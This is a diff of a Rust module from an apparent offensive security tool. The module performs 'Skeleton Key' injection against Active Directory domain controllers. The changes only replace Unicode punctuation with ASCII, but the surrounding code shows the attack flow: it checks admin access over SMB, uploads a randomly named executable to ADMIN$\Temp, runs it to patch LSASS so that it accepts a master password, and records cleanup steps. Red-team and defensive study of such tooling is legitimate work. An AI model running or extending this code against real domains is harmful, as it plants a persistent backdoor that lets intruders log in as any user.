@@ -1,4 +1,4 @@
-//! Skeleton Key injection — patch LSASS on a DC to accept a master password.
+//! Skeleton Key injection -- patch LSASS on a DC to accept a master password.
 //!
 //! # Attack Details
 //!
@@ -219,7 +219,7 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
         }
     }
 
-    // ── Step 1: Verify admin access ────────────────────────────
+    // -- Step 1: Verify admin access ----------------------------
     info!("[skeleton] Verifying admin access on {}", config.dc_ip);
     let admin_check = smb.check_admin_access().await;
     if !admin_check.has_admin {
@@ -233,13 +233,13 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
         config.dc_ip, admin_check.accessible_shares
     );
 
-    // ── Step 2: Upload & execute payload, or dry-run ────────────
+    // -- Step 2: Upload & execute payload, or dry-run ------------
     let (output, executed) = match &config.payload_path {
         Some(payload_path) => {
             // Upload payload to ADMIN$\Temp\<random>.exe
             let remote_name = format!("Temp\\{:08x}.exe", rand::random::<u32>());
             info!(
-                "[skeleton] Uploading {} → ADMIN$\\{}",
+                "[skeleton] Uploading {} -> ADMIN$\\{}",
                 payload_path, remote_name
             );
 
@@ -281,14 +281,14 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
         }
         None => {
             warn!(
-                "[skeleton] No payload_path specified — generating metadata only. \
+                "[skeleton] No payload_path specified -- generating metadata only. \
                  Set config.payload_path to a patching binary (e.g. a credential tool binary) for execution."
             );
             (String::new(), false)
         }
     };
 
-    // ── Build result ────────────────────────────────────────────
+    // -- Build result --------------------------------------------
     let cleanup_cmd = format!(
         "# Skeleton Key cleanup (requires DC reboot):\n\
          Restart-Computer -ComputerName {} -Force\n\
@@ -318,7 +318,7 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
         )
     } else {
         format!(
-            "Skeleton Key metadata (NOT EXECUTED — no payload_path):\n\
+            "Skeleton Key metadata (NOT EXECUTED -- no payload_path):\n\
              - Target: {}\n\
              - Preflight: {}\n\
              - Admin access: VERIFIED\n\
